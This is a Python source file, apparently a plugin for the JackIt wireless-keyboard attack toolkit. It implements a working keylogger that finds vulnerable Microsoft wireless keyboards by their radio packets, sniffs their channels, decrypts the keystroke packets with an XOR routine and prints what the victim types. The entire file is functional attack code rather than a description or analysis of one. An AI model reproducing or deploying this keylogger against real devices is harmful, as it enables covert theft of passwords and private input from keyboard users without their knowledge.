# -*- coding: utf-8 -*-

from __future__ import print_function, absolute_import
from six import iteritems
import sys
from jackit import duckyparser
from jackit.plugins import microsoft_enc

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


class KeyLogger(object):

    def __init__(self, jack, locale='us', timeout=300):
        self.jack = jack
        self.mapping = duckyparser.DuckyParser('', locale).hid_map
        self.hid = None
        self.timeout = timeout
        self.last_key = ''
        self.last_sequence = 0

    def attack(self, address, payload):
        if len(payload) == 16 and payload[1] == 0x78:
            print(G + '[+] ' + W + 'Found vulnerable MS keyboard with address: %s' % self.jack.to_display(address))
            self.hid = microsoft_enc.HID(address[::-1], payload)
            # old MS keyboards seem to use only these channels
            self.jack.channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]
            self.jack.sniff(self.timeout, self.jack.to_display(address), callback=self.log_keystroke)
        return

    def log_keystroke(self, address, payload):
        # Check if it's a keystroke packet
        if len(payload) == 16 and payload[1] == 0x78:
            # Check if it's a duplicate
            payload = self.hid.xor_crypt(payload)
            sequence = (payload[5] << 8) + payload[4]

            if sequence < self.last_sequence and (self.last_sequence - sequence) > 1000:
                self.last_sequence = sequence - 1

            if sequence > self.last_sequence:
                self.last_sequence = sequence
                key = payload[9]

                if not (key == self.last_key and (payload[10] or payload[11])):
                    self.last_key = key
                    letter = self.hid_decode(key, payload[7])

                    if letter:
                        sys.stdout.write(letter)
                        sys.stdout.flush()

    def hid_decode(self, key, status):
        for letter, codes in iteritems(self.mapping):
            if codes[0] == key and codes[1] == status:
                if len(letter) > 1:
                    return '[' + letter + ']'
                else:
                    return letter
        return ''

    def scan(self):
        print(G + '[+] ' + W + 'Starting Key Logger...')
        try:
            while True:
                self.jack.scan(timeout=60, callback=self.attack)
        except KeyboardInterrupt:
            print('\n ' + R + '(^C)' + O + ' interrupted\n')
            print('[-] Quitting' + W)
